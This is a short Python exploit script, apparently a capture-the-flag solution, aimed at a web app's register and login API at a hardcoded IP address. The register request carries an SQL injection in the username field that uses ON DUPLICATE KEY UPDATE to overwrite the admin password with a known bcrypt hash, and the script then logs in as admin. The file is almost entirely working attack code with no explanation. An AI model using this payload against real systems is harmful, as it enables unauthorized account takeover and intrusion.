import requests

URL = "http://134.122.106.203:31105"
# URL = "http://localhost:4444"

def register():
    dup = "$2b$12$jSXUhVnIZ8eHQbynD1y1TuZL7oMVevF8ORjYwQCFGlN0RbRgnf9Ei"
    res = requests.post(f"{URL}/api/register", json={
        "username":f'admin","{dup}") ON DUPLICATE KEY UPDATE password="{dup}"#","password":"1234',
        "password":'aaa'
    })
    return res.text

def login():
    res = requests.post(f"{URL}/api/login", json={
        "username":'admin',
        "password":'asd'
    })
    return res.headers, res.text

# print(register())
print(login())